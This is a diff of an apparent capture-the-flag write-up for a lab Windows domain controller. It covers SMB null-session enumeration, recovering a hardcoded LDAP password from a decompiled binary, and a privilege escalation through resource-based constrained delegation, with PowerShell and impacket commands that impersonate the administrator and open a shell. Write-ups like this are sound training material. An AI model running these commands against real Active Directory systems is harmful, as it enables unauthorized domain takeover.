@@ -4,17 +4,17 @@
 
 Nmap scan:
 
-<figure><img src="../../../.gitbook/assets/image (2322).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2322).png>)
 
 ### Null Session
 
 I found that SMB accepts null credentials for this machine:
 
-<figure><img src="../../../.gitbook/assets/image (1977).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1977).png>)
 
 Viewing the support-tools share, we find that it contains multiple binaries.
 
-<figure><img src="../../../.gitbook/assets/image (1295).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1295).png>)
 
 There's only one that was interesting, and it was the `UserInfo.exe` file. I took it back to my Windows VM and used dnSpy to open it.
 
@@ -22,11 +22,11 @@ There's only one that was interesting, and it was the `UserInfo.exe` file. I too
 
 When decompiled, it seems that the binary was sending LDAP queries:
 
-<figure><img src="../../../.gitbook/assets/image (435).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(435).png>)
 
 Looking around, I also found this `password` function.
 
-<figure><img src="../../../.gitbook/assets/image (728).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(728).png>)
 
 We can decode this easily using some Python and following their logic.
 
@@ -47,27 +47,27 @@ print (array1)
 
 This would output the password.
 
-<figure><img src="../../../.gitbook/assets/image (1156).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1156).png>)
 
 ### LDAPSearch
 
 Then, since the binary does LDAP queries, I wanted to use the username and password given by the binary to query LDAP.
 
-<figure><img src="../../../.gitbook/assets/image (134).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(134).png>)
 
 On analysing the output, I found a hidden password for the `support` user.
 
-<figure><img src="../../../.gitbook/assets/image (1088).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1088).png>)
 
 We can then `evil-winrm` in as this `support` user.
 
-<figure><img src="../../../.gitbook/assets/image (112).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(112).png>)
 
 ## Privilege Escalation
 
 Once in, I started Bloodhound to enumerate for me. Upon reviewing the contents, I saw this interesting set of permissions over the DC.
 
-<figure><img src="../../../.gitbook/assets/image (2133).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2133).png>)
 
 We can use PowerMad and PowerView to abuse the `GenericAll` privileges.
 
@@ -75,7 +75,6 @@ We can use PowerMad and PowerView to abuse the `GenericAll` privileges.
 
 We can use this set of commands to create a new user:
 
-{% code overflow="wrap" %}
 ```powershell
 New-MachineAccount -MachineAccount (Get-Variable -Name "FAKE01").Value -Password $(ConvertTo-SecureString 'password@123' -AsPlainText -Force) -Verbose
 Set-ADComputer (Get-Variable -Name "DC").Value -PrincipalsAllowedToDelegateToAccount ((Get-Variable -Name "FAKE01").Value + '$')
@@ -85,10 +84,9 @@ impacket-getST support.htb/fake01 -dc-ip <IP> -impersonate administrator -spn ww
 export KRB5CCNAME=administrator.ccache
 smbexec.py support/Administrator@support.htb -no-pass -k
 ```
-{% endcode %}
 
 This would spawn in a shell for us.
 
 How it works is that we first create a new user that has the Constrained Delegation privilege. Then, we are able to impersonate the administrator and request a ticket that we can use to gain a shell with `smbexec.py`.
 
-<figure><img src="../../../.gitbook/assets/image (2883).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2883).png>)
